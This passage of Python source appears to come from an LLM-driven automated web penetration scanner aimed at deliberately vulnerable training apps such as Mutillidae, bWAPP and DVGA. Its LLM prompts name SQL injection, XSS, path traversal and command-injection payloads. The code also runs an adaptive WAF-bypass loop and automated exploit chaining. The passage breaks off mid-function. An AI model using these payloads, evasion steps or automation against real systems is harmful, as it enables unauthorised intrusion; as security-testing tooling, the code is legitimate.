            app_name = "OWASP Mutillidae II"
            app_specific = [
                "/index.php?page=login.php",
                "/index.php?page=user-info.php",
                "/index.php?page=dns-lookup.php",
                "/index.php?page=text-file-viewer.php",
                "/index.php?page=source-viewer.php",
                "/index.php?page=xml-validator.php",
                "/index.php?page=set-up-database.php",
                "/index.php?page=add-to-your-blog.php",
                "/index.php?page=view-someones-blog.php",
                "/index.php?page=register.php",
                "/index.php?page=browser-info.php",
                "/index.php?page=user-poll.php",
                "/index.php?page=pen-test-tool-lookup.php",
                "/index.php?page=capture-data.php",
                "/index.php?page=arbitrary-file-inclusion.php",
                "/index.php?page=secret-administrative-pages.php",
                "/index.php?page=user-agent-impersonation.php",
                "/index.php?page=view-user-privilege-level.php",
                "/index.php?page=document-viewer.php",
                "/index.php?page=site-footer-xss-discussion.php",
                "/webservices/rest/ws-user-account.php",
                "/webservices/soap/ws-lookup-dns.php",
                "/ajax/index.php?page=pen-test-tool-lookup-ajax.php",
                "/passwords/accounts.xml",
            ]
        elif "8083" in target_lower or "bwapp" in target_lower:
            app_name = "bWAPP (Buggy Web Application)"
            app_specific = [
                "/bWAPP/sqli_1.php", "/bWAPP/sqli_2.php", "/bWAPP/sqli_6.php",
                "/bWAPP/sqli_blind_1.php", "/bWAPP/sqli_blind_2.php",
                "/bWAPP/xss_stored_1.php", "/bWAPP/xss_reflected_1.php",
                "/bWAPP/xss_dom.php", "/bWAPP/os_cmd_exec.php",
                "/bWAPP/htmli_get.php", "/bWAPP/htmli_post.php",
                "/bWAPP/ssrf.php", "/bWAPP/csrf_1.php",
                "/bWAPP/lfi.php", "/bWAPP/rfi.php",
                "/bWAPP/unrestricted_file_upload.php",
                "/bWAPP/xxe-1.php", "/bWAPP/xxe-2.php",
                "/bWAPP/ldapi.php", "/bWAPP/smtp.php",
                "/bWAPP/rlfi.php", "/bWAPP/ssi.php",
                "/bWAPP/login.php",
            ]
        elif "5013" in target_lower or "dvga" in target_lower:
            app_name = "Damn Vulnerable GraphQL Application (DVGA)"
            app_specific = [
                "/graphql",
                "/graphiql",
            ]
        else:
            app_name = "Unknown web application"
            app_specific = []

        app_specific_urls = [target_base + p if p.startswith("/") else p for p in app_specific]
        # 우선순위: Phase 4 크롤 결과 → 벤치마크 하드코딩 → base URL
        effective_endpoints = live_urls[:20] or app_specific_urls[:20] or [target_base]

        # ── OpenAPI/Swagger 스펙 자동 탐지 ──
        api_spec_context = ""
        is_rest_api = False
        try:
            import urllib.request as _ureq
            for spec_path in ["/openapi.json", "/swagger.json", "/api-docs", "/v1/api-docs", "/docs/openapi.json"]:
                try:
                    with _ureq.urlopen(target_base + spec_path, timeout=5) as _sr:
                        _spec = _json.loads(_sr.read().decode())
                    paths = _spec.get("paths", {})
                    api_lines = []
                    for path, methods in list(paths.items())[:40]:
                        for method, op in methods.items():
                            if method.upper() not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                                continue
                            req_body = op.get("requestBody", {})
                            body_fields = []
                            for ct_data in req_body.get("content", {}).values():
                                props = ct_data.get("schema", {}).get("properties", {})
                                body_fields = list(props.keys())
                            params = [p.get("name") for p in op.get("parameters", []) if p.get("in") in ("path", "query")]
                            line = f"{method.upper()} {path}"
                            if params:
                                line += f" params:{params}"
                            if body_fields:
                                line += f" body:{body_fields}"
                            api_lines.append(line)
                    api_spec_context = f"OpenAPI spec ({spec_path}):\n" + "\n".join(api_lines)
                    is_rest_api = True
                    print(f"  [API-SPEC] Found {len(api_lines)} endpoints in {spec_path}", flush=True)
                    break
                except Exception:
                    continue
        except Exception:
            pass

        # 벡터 목록 정리 (ID + 설명)
        vec_list = "\n".join(
            f"  - {v.id}: {v.name_en}" for v in phase_vectors[:30]
        )

        # LLM에게 보낼 프롬프트 — attempt 결정 없이 공격 파라미터만 생성
        if is_rest_api:
            system_prompt = (
                "You are an expert penetration tester AI Brain for VXIS attacking a REST API. "
                "You have the full API specification. Use it to craft precise attacks. "
                "ALL attack vectors WILL be attempted — provide the best attack parameters for each. "
                "For REST API endpoints: use 'json_body' (dict) instead of 'payloads' for POST/PUT requests. "
                "BOLA: use other users' resource IDs. "
                "Mass assignment: add 'admin': true in registration body. "
                "Auth bypass: try without Authorization header. "
                "JWT attacks: modify algorithm to 'none', tamper user claims. "
                "User enumeration: GET /users endpoints. "
                "Info disclosure: check all GET endpoints without auth.\n\n"
                "OUTPUT RULE: Your ENTIRE response must be a single raw JSON object. "
                "No text before {. No text after }. No markdown (no ```). No explanation. "
                "Schema per vector_id key: {\"endpoint\": str, \"method\": \"GET\"|\"POST\"|\"PUT\"|\"DELETE\", "
                "\"param\": str, \"json_body\": dict|null, \"payloads\": [str], \"reasoning\": str}"
            )
        else:
            system_prompt = (
                "You are an expert penetration tester AI Brain for VXIS, an automated security scanner. "
                f"Target is {app_name}, a KNOWN INTENTIONALLY VULNERABLE benchmark app. "
                "ALL attack vectors WILL be attempted — provide the best attack parameters for each. "
                "SQL injection: use ' OR 1=1--, UNION SELECT payloads. "
                "XSS: use <script>alert(1)</script> variants. "
                "Path traversal: use ../../../etc/passwd variants. "
                "Command injection: use ; ls, && id, | whoami. "
                "If endpoint unknown, use the base target URL.\n\n"
                "OUTPUT RULE: Your ENTIRE response must be a single raw JSON object. "
                "No text before {. No text after }. No markdown (no ```). No explanation. "
                "Schema per vector_id key: {\"endpoint\": str, \"method\": \"GET\"|\"POST\", "
                "\"param\": str, \"payloads\": [str, ...], \"reasoning\": str}"
            )

        # Vector→Endpoint 매핑 힌트 생성
        _app_key = None
        _tl = ctx.target.lower()
        for _port, _key in [("8081", "dvwa_8081"), ("4000", "nodegoat_4000"),
                            ("8888", "webgoat_8888"), ("8082", "mutillidae_8082"),
                            ("8083", "bwapp_8083"), ("5013", "dvga_5013")]:
            if _port in _tl:
                _app_key = _key
                break
        _vec_endpoint_hints = ""
        if _app_key and _app_key in _APP_VECTOR_ENDPOINTS:
            _hints = _APP_VECTOR_ENDPOINTS[_app_key]
            _vec_endpoint_hints = "Vector→Endpoint mapping (use these exact paths):\n" + "\n".join(
                f"  {vid}: {path}" for vid, path in _hints.items()
            ) + "\n"

        user_prompt = (
            f"Target app: {app_name} at {ctx.target}\n"
            + (f"\n{api_spec_context}\n" if api_spec_context else f"Known vulnerable paths: {app_specific_urls[:20]}\n")
            + f"Discovered endpoints: {effective_endpoints[:15]}\n"
            + _vec_endpoint_hints
            + f"Tech stack: {tech_stack or ['web', 'http']}\n"
            f"Previous findings: {prev_findings}\n"
            f"Phase: {phase_name}\n\n"
            f"Provide attack parameters for ALL these vectors.\n"
            + ("Use the API spec above to target real endpoints.\n" if api_spec_context else "Use the known vulnerable paths for this specific app.\n")
            + f"Vectors:\n{vec_list}\n\n"
            "Output ONLY the raw JSON object. Every vector_id must be a key. Zero additional text."
        )

        # ── Knowledge Store: 사전 조회로 LLM 호출 절약 ──
        # KB에 컴파일된 패턴이 있으면 LLM 호출 없이 사용
        kb_decisions: dict[str, dict] = {}
        kb_store = None
        kb_context_sig = ""
        KB_CONFIDENCE_THRESHOLD = 0.7
        try:
            from vxis.knowledge.store import KnowledgeStore, ExecutionRecord
            kb_store = KnowledgeStore()
            kb_context_sig = KnowledgeStore.build_context_signature(
                tech_stack=tech_stack or ["web", "http"],
            )
            for vec in phase_vectors:
                vec_sig = f"{kb_context_sig}+{vec.id}"
                matched = kb_store.match_patterns(vec_sig)
                if not matched:
                    matched = kb_store.match_patterns(kb_context_sig)
                if matched and matched[0].confidence >= KB_CONFIDENCE_THRESHOLD:
                    p = matched[0]
                    args = p.action_args or {}
                    kb_decisions[vec.id] = {
                        "attempt": True,
                        "reasoning": f"[KB-HIT] {p.reasoning} (conf {p.confidence:.0%})",
                        "targets": [{
                            "endpoint": args.get("endpoint", ctx.target),
                            "method": args.get("method", "GET"),
                            "param": args.get("param", ""),
                            "payloads": args.get("payloads", [args.get("summary", "")]),
                            "json_body": args.get("json_body"),
                        }],
                        "_kb_pattern_id": p.id,
                    }
            if kb_decisions:
                logger.info("  [KB-HIT] %d/%d vectors served from Knowledge Store (skipping LLM)",
                            len(kb_decisions), len(phase_vectors))
        except Exception as _kb_exc:
            logger.debug("  [KB] lookup failed: %s", _kb_exc)
            kb_store = None

        # KB가 모든 벡터를 커버하면 LLM 호출 자체 스킵
        remaining_vectors = [v for v in phase_vectors if v.id not in kb_decisions]
        if not remaining_vectors:
            logger.info("  [KB-FULL] Phase %s: all %d vectors served from KB",
                        phase_name, len(phase_vectors))
            return kb_decisions

        try:
            logger.info("  [LLM-CALL] Phase %s: %d vectors not in KB → calling LLM",
                        phase_name, len(remaining_vectors))
            response = self.brain._call_llm_with_fallback(system_prompt, user_prompt)
            if not response:
                return kb_decisions

            raw = _parse_llm_json(response)

            # 모든 벡터 attempt=True 고정 — LLM은 파라미터만 결정
            decisions: dict[str, dict] = dict(kb_decisions)
            for vec in remaining_vectors:
                vid = vec.id
                d = raw.get(vid, {})
                decisions[vid] = {
                    "attempt": True,
                    "reasoning": d.get("reasoning", "LLM attack params"),
                    "targets": [{
                        "endpoint": d.get("endpoint", ctx.target),
                        "method": d.get("method", "GET"),
                        "param": d.get("param", ""),
                        "payloads": d.get("payloads", [""]),
                        "json_body": d.get("json_body"),  # REST API JSON body 공격
                    }],
                }

            logger.info("  [LLM-BRAIN] Phase %s: %d/%d vectors (all attempt, %d from KB)",
                        phase_name, len(decisions), len(phase_vectors), len(kb_decisions))

            # ── Knowledge Store: LLM 결정 기록 ──
            if kb_store is not None:
                try:
                    for vec in remaining_vectors:
                        d = raw.get(vec.id, {})
                        if not d:
                            continue
                        vec_sig = f"{kb_context_sig}+{vec.id}"
                        endpoint = d.get("endpoint", ctx.target)
                        method = d.get("method", "GET")
                        param = d.get("param", "")
                        payloads = d.get("payloads", [])
                        args_summary = f"{method} {endpoint} param={param} n_payloads={len(payloads) if isinstance(payloads, list) else 0}"
                        record = ExecutionRecord(
                            tool=f"brain:{vec.id}",
                            context_signature=vec_sig,
                            args_summary=args_summary,
                            effectiveness=0.5,  # 초기 추정 — 실제 결과는 record_finding에서 보정
                            findings_produced=0,
                            finding_types=[getattr(vec, "category", "")] if hasattr(vec, "category") else [],
                            target_tech=list(tech_stack or []),
                        )
                        kb_store.record_execution(record)
                except Exception as _rec_exc:
                    logger.debug("  [KB] record failed: %s", _rec_exc)

            return decisions

        except Exception as exc:
            logger.warning("  [LLM-BRAIN] Batch decision failed: %s — using type-aware fallback", exc)
            return {
                vec.id: _make_fallback_decision(vec, ctx.target, app_specific_urls)
                for vec in phase_vectors
            }

    # ── Brain consultation per vector ─────────────────────────

    def _consult_brain_for_vector(
        self,
        ctx: ScanContext,
        vector_id: str,
        vector_name: str,
        phase_name: str,
    ) -> dict[str, Any] | None:
        """Brain에게 벡터 실행 여부를 물어본다.

        FileBasedBrain일 때: observation.json 쓰고 decision.json 대기
        AgentBrain일 때: None 반환 (기존 로직 유지)

        Returns:
            None — Brain 없음 또는 FileBasedBrain이 아님, 기존 로직으로 실행
            dict — Brain의 decision (attempt, reasoning, targets, chain_hint)
        """
        from vxis.agent.brain_filebased import FileBasedBrain

        if not isinstance(self.brain, FileBasedBrain):
            return None

        from vxis.agent.brain import AgentObservation

        # 요약 findings — 토큰 절약
        _compressed = _compress_findings_for_prompt(ctx.findings, max_items=15)
        obs = AgentObservation(
            target=ctx.target,
            tech_stack=getattr(ctx, "tech_stack", []),
            findings=_compressed,
            executed_tools=[
                {"tool": p, "status": "done"}
                for p in ctx.phases_completed[-20:]
            ],
        )

        # FileBasedBrain에 현재 벡터 정보 설정
        self.brain._current_vector_id = vector_id
        self.brain._current_vector_name = vector_name
        self.brain._current_phase = phase_name

        actions = self.brain.think(obs)

        if not actions:
            return {"attempt": False, "reasoning": "brain returned no actions"}

        first = actions[0]
        if first.tool == "SKIP":
            return {"attempt": False, "reasoning": first.reasoning}

        return {
            "attempt": True,
            "reasoning": first.reasoning,
            "targets": [a.args for a in actions],
            "actions": actions,
        }

    # ── Brain decision execution ────────────────────────────

    async def _execute_brain_decisions(
        self,
        phase_name: str,
        ctx: ScanContext,
    ) -> None:
        """Brain이 결정한 공격을 Hands로 실제 실행한다.

        ctx._brain_decisions에 저장된 decision 중 attempt=True인 것들의
        targets/payloads를 실제 HTTP 요청으로 보내고 결과를 해석한다.
        """
        import re as _re

        decisions = getattr(ctx, "_brain_decisions", {})
        if not decisions:
            return

        # 이 Phase에서 attempt=True인 결정만 필터
        phase_match = _re.match(r"(Phase \d+)", phase_name)
        if not phase_match:
            return
        phase_key = phase_match.group(1)

        try:
            from vxis.scoring.vectors import WEB_VECTORS
            phase_vector_ids = {v.id for v in WEB_VECTORS if v.phase == phase_key}
        except ImportError:
            return

        active_decisions = {
            vid: d for vid, d in decisions.items()
            if vid in phase_vector_ids and d.get("attempt", False)
        }

        if not active_decisions:
            print(f"  {phase_key}: 0 vectors to attack", flush=True)
            return

        self._emit("brain_thinking", {
            "phase": phase_key,
            "vector_count": len(active_decisions),
            "vectors": [{"id": vid, "reasoning": d.get("reasoning", "")[:100]}
                        for vid, d in list(active_decisions.items())[:5]],
        })
        if not self._event_callback:
            print(f"  {phase_key}: Brain attacking {len(active_decisions)} vectors...", flush=True)

        # Hands(SessionManager) 획득 — ctx에 이미 인증된 세션이 있으면 재사용
        # 병렬 Phase가 동시에 초기화하려 할 때 double-check asyncio lock으로 방지
        try:
            from vxis.interaction.hands import SessionManager

            # lazy asyncio.Lock 초기화
            if not hasattr(ctx, "_brain_session_lock") or ctx._brain_session_lock is None:
                ctx._brain_session_lock = _asyncio.Lock()

            async with ctx._brain_session_lock:
                if hasattr(ctx, "_brain_session_mgr") and ctx._brain_session_mgr is not None:
                    mgr = ctx._brain_session_mgr
                    session = ctx._brain_session
                else:
                    mgr = SessionManager()
                    session = await mgr.get_session(ctx.target)
                    # 타겟 자동 인증 시도 (DVWA 등 벤치마크 앱)
                    session = await self._auto_authenticate(ctx, session, mgr)
                    ctx._brain_session_mgr = mgr
                    ctx._brain_session = session
        except Exception as exc:
            logger.warning("  [BRAIN-EXEC] Hands unavailable: %s", exc)
            return

        # 각 decision의 targets/payloads 실행
        for vector_id, decision in active_decisions.items():
            # 시도한 벡터 tracker에 기록 (attempt=True인 것만 여기 들어옴)
            ctx.score_tracker.record_vector_attempt(vector_id)

            targets = decision.get("targets", [])
            reasoning = decision.get("reasoning", "")

            for target_spec in targets:
                endpoint = target_spec.get("endpoint", "/")
                endpoint = _normalize_endpoint(endpoint, ctx.target)
                method = target_spec.get("method", "GET").upper()
                param = target_spec.get("param", "")
                payloads = target_spec.get("payloads", [])
                note = target_spec.get("note", "")

                # 벡터별 실시간 출력
                _ep_short = endpoint[-45:] if len(endpoint) > 45 else endpoint
                _json_flag = " [JSON]" if target_spec.get("json_body") else ""
                self._emit("attack", {
                    "vector_id": vector_id,
                    "method": method,
                    "endpoint": endpoint,
                    "json_body": bool(target_spec.get("json_body")),
                })
                if not self._event_callback:
                    print(f"    ▶ {vector_id:18s} {method:4s} {_ep_short}{_json_flag}", flush=True)

                if not payloads:
                    payloads = [""]  # 빈 페이로드라도 엔드포인트 접근 시도

                # Smart Probe: 폼 리플레이 — 페이지 GET → 폼 파싱 → 타겟만 교체
                form_cache = target_spec.get("_form_cache")
                if form_cache is None and param:
                    try:
                        probe_resp = await session.get(endpoint)
                        if probe_resp.forms:
                            # 타겟 파라미터를 포함하는 폼 찾기
                            best_form = None
                            for form in probe_resp.forms:
                                if param in form.fields:
                                    best_form = form
                                    break
                            if not best_form:
                                best_form = probe_resp.forms[0]  # fallback: 첫 번째 폼

                            # action 정규화: "#", 빈 값, 풀 URL → endpoint 사용
                            raw_action = best_form.action or ""
                            if not raw_action or raw_action.endswith("#") or raw_action == endpoint:
                                normalized_action = endpoint
                            elif raw_action.startswith("http"):
                                # 풀 URL에서 path만 추출
                                from urllib.parse import urlparse as _urlparse
                                normalized_action = _urlparse(raw_action).path or endpoint
                            else:
                                normalized_action = raw_action

                            form_cache = {
                                "fields": dict(best_form.fields),
                                "method": best_form.method.upper(),
                                "action": normalized_action,
                                "enctype": best_form.enctype,
                            }
                        else:
                            form_cache = {"fields": {}, "method": method, "action": endpoint}
                    except Exception:
                        form_cache = {"fields": {}, "method": method, "action": endpoint}
                    target_spec["_form_cache"] = form_cache

                # ── REST API JSON body 공격 ── (json_body 있으면 payloads 루프 전에 처리)
                json_body = target_spec.get("json_body")
                if json_body and isinstance(json_body, dict):
                    try:
                        if method in ("GET", "DELETE"):
                            resp = await session.get(endpoint)
                        else:
                            resp = await session.post(endpoint, json_data=json_body)
                        body = resp.text[:5000] if hasattr(resp, "text") else ""
                        status = resp.status if hasattr(resp, "status") else 0
                        headers = {}
                        if hasattr(resp, "headers"):
                            try:
                                headers = {k.lower(): v for k, v in resp.headers.items()}
                            except Exception:
                                pass
                        finding_created = self._analyze_probe_response(
                            ctx, vector_id, endpoint, "json_body", str(json_body)[:100], body, status, headers,
                        )
                        if finding_created:
                            new_finding = ctx.findings[-1] if ctx.findings else None
                            from vxis.agent.brain import AgentBrain as _ABrain, AgentAction
                            if isinstance(self.brain, _ABrain) and new_finding:
                                _prev = _compress_findings_for_prompt(ctx.findings[:-1], max_items=10)
                                _interp = self.brain.interpret_probe_result(
                                    vector_id=vector_id, endpoint=endpoint, param="json_body",
                                    payload=str(json_body)[:200], body=body, status=status,
                                    current_findings=_prev,
                                )
                                _brain_level = _interp.get("level", 2)
                                _hint = _interp.get("escalation_hint", "")[:55]
                                print(f"      !! HIT  {vector_id} L{_brain_level} [JSON]"
                                      + (f" → {_hint}" if _hint else ""), flush=True)
                                try:
                                    ctx.score_tracker.escalate_level(new_finding.id, _brain_level)
                                except Exception:
                                    pass
                            else:
                                print(f"      !! HIT  {vector_id} [JSON] on {endpoint[-40:]}", flush=True)
                            from vxis.agent.brain import AgentAction
                            self.brain.record_result(
                                AgentAction(tool="PROBE", args=target_spec, reasoning=reasoning),
                                {"success": True, "findings": [{"vector_id": vector_id, "endpoint": endpoint}]},
                            )
                            if new_finding:
                                await self._chain_from_finding(ctx, new_finding, session, vector_id, endpoint)
                    except Exception as exc:
                        logger.debug("    [FAIL-JSON] %s %s: %s", vector_id, endpoint, exc)
                    continue  # json_body 처리 완료 — payloads 루프 건너뜀

                # WAF bypass engine — lazy init, shared per scan
                if not hasattr(ctx, "_waf_bypass_engine") or ctx._waf_bypass_engine is None:
                    try:
                        from vxis.agent.waf_bypass import WAFBypassEngine
                        ctx._waf_bypass_engine = WAFBypassEngine(max_iterations=3)
                    except Exception:
                        ctx._waf_bypass_engine = None
                target_spec.setdefault("_waf_bypass_attempts", 0)

                _endpoint_timed_out = False
                for payload in payloads[:10]:  # 페이로드당 최대 10개
                    if _endpoint_timed_out:
                        break  # 이 엔드포인트는 응답 느림 → 나머지 페이로드 스킵
                    try:
                        if form_cache and form_cache.get("fields") and param:
                            # 폼 리플레이: 원본 필드 유지, 타겟만 교체
                            form_data = dict(form_cache["fields"])
                            form_data[param] = payload
                            form_method = form_cache.get("method", method)
                            form_action = form_cache.get("action", endpoint)

                            if form_method == "GET":
                                resp = await session.get(form_action, params=form_data)
                            else:
                                if form_cache.get("enctype", "").startswith("application/json"):
                                    resp = await session.post(form_action, json_data=form_data)
                                else:
                                    resp = await session.post(form_action, data=form_data)
                        elif method == "GET" and param:
                            resp = await session.get(endpoint, params={param: payload})
                        elif method == "POST" and param:
                            resp = await session.post(endpoint, data={param: payload})
                        elif method == "GET":
                            resp = await session.get(endpoint)
                        else:
                            resp = await session.post(endpoint, data={"input": payload})

                        # 응답 해석 — 취약점 시그니처 탐지
                        body = resp.text[:5000] if hasattr(resp, "text") else ""
                        status = resp.status if hasattr(resp, "status") else 0
                        headers: dict = {}
                        if hasattr(resp, "headers"):
                            try:
                                headers = {k.lower(): v for k, v in resp.headers.items()}
                            except Exception:
                                pass

                        # ── Adaptive WAF Bypass ──
                        _waf_engine = getattr(ctx, "_waf_bypass_engine", None)
                        if _waf_engine is not None:
                            _waf_marker = _waf_engine._detect_waf(body, status, headers)
                            while (
                                _waf_marker
                                and target_spec["_waf_bypass_attempts"] < 3
                            ):
                                target_spec["_waf_bypass_attempts"] += 1
                                logger.info(
                                    "    [WAF-BLOCK] %s %s blocked (%s) — try %d",
                                    vector_id, endpoint, _waf_marker,
                                    target_spec["_waf_bypass_attempts"],
                                )
                                self._emit("waf_bypass", {
                                    "vector_id": vector_id,
                                    "endpoint": endpoint,
                                    "stage": "blocked",
                                    "marker": _waf_marker,
                                    "attempt": target_spec["_waf_bypass_attempts"],
                                    "payload": (payload or "")[:120],
                                })
                                try:
                                    new_payload = await _waf_engine.evolve_payload(
                                        original_payload=payload,
                                        response_body=body,
                                        response_status=status,
                                        vector_type=vector_id,
                                        brain=self.brain,
                                        headers=headers,
                                    )
                                except Exception as _wexc:
                                    logger.debug("    [WAF-BYPASS] evolve failed: %s", _wexc)
                                    new_payload = None
                                if not new_payload:
                                    break
                                logger.info(
                                    "    [WAF-BYPASS-TRY] %s -> %s",
                                    vector_id, new_payload[:80],
                                )
                                self._emit("waf_bypass", {
                                    "vector_id": vector_id,
                                    "endpoint": endpoint,
                                    "stage": "try",
                                    "attempt": target_spec["_waf_bypass_attempts"],
                                    "payload": new_payload[:120],
                                })
                                try:
                                    if form_cache and form_cache.get("fields") and param:
                                        form_data = dict(form_cache["fields"])
                                        form_data[param] = new_payload
                                        form_method = form_cache.get("method", method)
                                        form_action = form_cache.get("action", endpoint)
                                        if form_method == "GET":
                                            resp = await session.get(form_action, params=form_data)
                                        else:
                                            if form_cache.get("enctype", "").startswith("application/json"):
                                                resp = await session.post(form_action, json_data=form_data)
                                            else:
                                                resp = await session.post(form_action, data=form_data)
                                    elif method == "GET" and param:
                                        resp = await session.get(endpoint, params={param: new_payload})
                                    elif method == "POST" and param:
                                        resp = await session.post(endpoint, data={param: new_payload})
                                    elif method == "GET":
                                        resp = await session.get(endpoint)
                                    else:
                                        resp = await session.post(endpoint, data={"input": new_payload})
                                    body = resp.text[:5000] if hasattr(resp, "text") else ""
                                    status = resp.status if hasattr(resp, "status") else 0
                                    headers = {}
                                    if hasattr(resp, "headers"):
                                        try:
                                            headers = {k.lower(): v for k, v in resp.headers.items()}
                                        except Exception:
                                            pass
                                    payload = new_payload
                                    _waf_marker_new = _waf_engine._detect_waf(body, status, headers)
                                    if not _waf_marker_new:
                                        logger.info(
                                            "    [WAF-BYPASS-SUCCESS] %s evaded WAF on %s",
                                            vector_id, endpoint,
                                        )
                                        self._emit("waf_bypass", {
                                            "vector_id": vector_id,
                                            "endpoint": endpoint,
                                            "stage": "success",
                                            "payload": new_payload[:120],
                                        })
                                        _waf_marker = None
                                        break
                                    _waf_marker = _waf_marker_new
                                except Exception as _retry_exc:
                                    logger.debug(
                                        "    [WAF-BYPASS] retry request failed: %s", _retry_exc,
                                    )
                                    break

                        finding_created = self._analyze_probe_response(
                            ctx, vector_id, endpoint, param, payload, body, status, headers,
                        )

                        if finding_created:
                            # Brain.interpret: LLM이 exploitation level 결정
                            new_finding = ctx.findings[-1] if ctx.findings else None
                            from vxis.agent.brain import AgentBrain as _ABrain, AgentAction
                            if isinstance(self.brain, _ABrain) and new_finding:
                                _prev = _compress_findings_for_prompt(ctx.findings[:-1], max_items=10)
                                _interp = self.brain.interpret_probe_result(
                                    vector_id=vector_id, endpoint=endpoint, param=param,
                                    payload=payload, body=body, status=status,
                                    current_findings=_prev,
                                )
                                _brain_level = _interp.get("level", 2)
                                _hint = _interp.get("escalation_hint", "")[:55]
                                self._emit("hit", {
                                    "vector_id": vector_id,
                                    "endpoint": endpoint,
                                    "level": _brain_level,
                                    "confidence": _interp.get("confidence", "?"),
                                    "hint": _hint,
                                    "finding_id": new_finding.id if new_finding else None,
                                })
                                if not self._event_callback:
                                    print(f"      !! HIT  {vector_id} L{_brain_level} [{_interp.get('confidence','?')}]"
                                          + (f" → {_hint}" if _hint else ""), flush=True)
                                try:
                                    ctx.score_tracker.escalate_level(new_finding.id, _brain_level)
                                except Exception:
                                    pass
                            else:
                                self._emit("hit", {
                                    "vector_id": vector_id,
                                    "endpoint": endpoint,
                                    "level": None,
                                })
                                if not self._event_callback:
                                    print(f"      !! HIT  {vector_id} on {endpoint[-40:]}", flush=True)

                            # result 기록
                            self.brain.record_result(
                                AgentAction(tool="PROBE", args=target_spec, reasoning=reasoning),
                                {
                                    "success": True,
                                    "findings": [{
                                        "vector_id": vector_id,
                                        "endpoint": endpoint,
                                        "param": param,
                                        "payload": payload[:100],
                                        "status": status,
                                    }],
                                },
                            )

                            # 체이닝: finding 확인 즉시 follow-up 공격 실행
                            if new_finding:
                                await self._chain_from_finding(
                                    ctx, new_finding, session, vector_id, endpoint,
                                )

                    except Exception as exc:
                        # 예외 타입별 분류 — 원인 추적 (module-level _httpx 사용)
                        if isinstance(exc, _httpx.TimeoutException):
                            _endpoint_timed_out = True
                            logger.debug("    [TIMEOUT] %s %s", vector_id, endpoint)
                        elif isinstance(exc, _httpx.ConnectError):
                            logger.warning("    [CONNECT-FAIL] %s %s: %s", vector_id, endpoint, exc)
                        elif isinstance(exc, _httpx.HTTPError):
                            logger.debug("    [HTTP-FAIL] %s %s: %s", vector_id, endpoint, exc)
                        else:
                            logger.warning("    [VECTOR-FAIL] %s %s: %s", vector_id, endpoint, exc)
                            logger.debug("    %s traceback:", vector_id, exc_info=True)

        # 세션은 닫지 않음 — 다음 Phase에서 재사용

    # 스캔 전체에서 체이닝 재귀로 인한 LLM 호출 상한 (무한 폭증 방지)
    MAX_CHAIN_LLM_CALLS: int = 50

    async def _chain_from_finding(
        self,
        ctx: ScanContext,
        finding: Any,
        session: Any,
        vector_id: str,
        endpoint: str,
        _depth: int = 0,
    ) -> None:
        """Finding 확인 즉시 Brain-first 체이닝 follow-up 실행.

        Brain-First 원칙: finding 하나로 멈추지 않는다.
        각 finding 타입별로 다음 단계를 즉시 시도한다.

        LLM 예산 보호: 재귀 × 병렬 phase로 인한 LLM 호출 폭증 방지.
        """
        from vxis.scoring.tracker import AttackChain, ChainStep

        # 예산 체크 — ctx에 카운터 저장
        _chain_count = getattr(ctx, "_chain_llm_count", 0)
        if _chain_count >= self.MAX_CHAIN_LLM_CALLS:
            logger.debug("  [CHAIN-BUDGET] Max chain LLM calls reached (%d)", _chain_count)
            return
        ctx._chain_llm_count = _chain_count + 1

        ftype = getattr(finding, "finding_type", "")
        fid = getattr(finding, "id", "")
        if not fid:
            return

        chain_id = f"CHAIN-{ftype.upper()}-{fid[:8]}"
        existing_ids = {c.chain_id for c in ctx.score_tracker.attack_chains}
        if chain_id in existing_ids:
            return

        chain = AttackChain(
            chain_id=chain_id,
            description_en=f"Chain from {ftype} on {endpoint}",
            description_ko=f"{endpoint}의 {ftype} 발견에서 시작된 공격 체인",
            final_impact="Escalated access via chained exploit|||체이닝 익스플로잇을 통한 권한 상승",
        )

        self._emit("chain_start", {
            "finding_type": ftype,
            "finding_id": fid,
            "endpoint": endpoint,
            "chain_id": chain_id,
            "vector_id": vector_id,
        })
        if not self._event_callback:
            print(f"      >> CHAIN starting from {ftype} on {endpoint[-45:]}", flush=True)

        # Step 1: 최초 finding을 체인의 첫 단계로 등록
        chain.steps.append(ChainStep(
            step_index=0,
            vector_id=vector_id,
            finding_id=fid,
            level=ctx.score_tracker.exploitation_levels.get(fid, 2),
            description_en=getattr(finding, "title", "").split("|||")[0][:120],
            description_ko=getattr(finding, "title", "").split("|||")[-1][:120],
        ))

        try:
            # ── Brain-First 체이닝: AgentBrain이 다음 공격 결정 ──
            from vxis.agent.brain import AgentBrain as _ABrain2
            if isinstance(self.brain, _ABrain2):
                _prev_findings = [
                    {"type": getattr(f, "finding_type", ""), "component": getattr(f, "affected_component", "")}
                    for f in ctx.findings
                ]
                _brain_attacks = self.brain.generate_chain_attacks(
                    finding_type=ftype,
                    endpoint=endpoint,
                    description=getattr(finding, "description", "")[:300],
                    target=ctx.target,
                    current_findings=_prev_findings,
                )
                if _brain_attacks:
                    for _atk in _brain_attacks:
                        _ep = _atk.get("endpoint", endpoint)
                        _mth = _atk.get("method", "GET").upper()
                        _prm = _atk.get("param", "")
                        _payloads = _atk.get("payloads", [""])[:5]
                        _vid = _atk.get("vector_id", "WEB-CHAIN")
                        _lvl = _atk.get("expected_level", 3)
                        _rsn = _atk.get("reasoning", "")
                        logger.info("    [BRAIN-CHAIN] trying %s on %s (expected L%d)", _vid, _ep, _lvl)
                        for _pld in _payloads:
                            try:
                                if _mth == "GET" and _prm:
                                    _r = await session.get(_ep, params={_prm: _pld})
                                elif _mth == "POST" and _prm:
                                    _r = await session.post(_ep, data={_prm: _pld})
                                elif _mth == "GET":
                                    _r = await session.get(_ep)
                                else:
                                    _r = await session.post(_ep, data={"input": _pld})
                                _rbody = _r.text[:3000] if hasattr(_r, "text") else ""
                                _rstatus = _r.status if hasattr(_r, "status") else 0
                                _chain_hit = self._analyze_probe_response(
                                    ctx, _vid, _ep, _prm, _pld, _rbody, _rstatus, {},
                                )
                                if _chain_hit:
                                    _cf = ctx.findings[-1] if ctx.findings else None
                                    if _cf:
                                        try:
                                            ctx.score_tracker.escalate_level(_cf.id, _lvl)
                                        except Exception:
                                            pass
                                        chain.steps.append(ChainStep(
                                            step_index=len(chain.steps),
                                            vector_id=_vid,
                                            finding_id=_cf.id,
                                            level=_lvl,
                                            description_en=_rsn[:120],
                                            description_ko=_rsn[:120],
                                        ))
                                        self._emit("chain_step", {
                                            "chain_id": chain_id,
                                            "vector_id": _vid,
                                            "endpoint": _ep,
                                            "level": _lvl,
                                            "reasoning": _rsn[:80],
                                            "step_index": len(chain.steps),
                                        })
                                        if not self._event_callback:
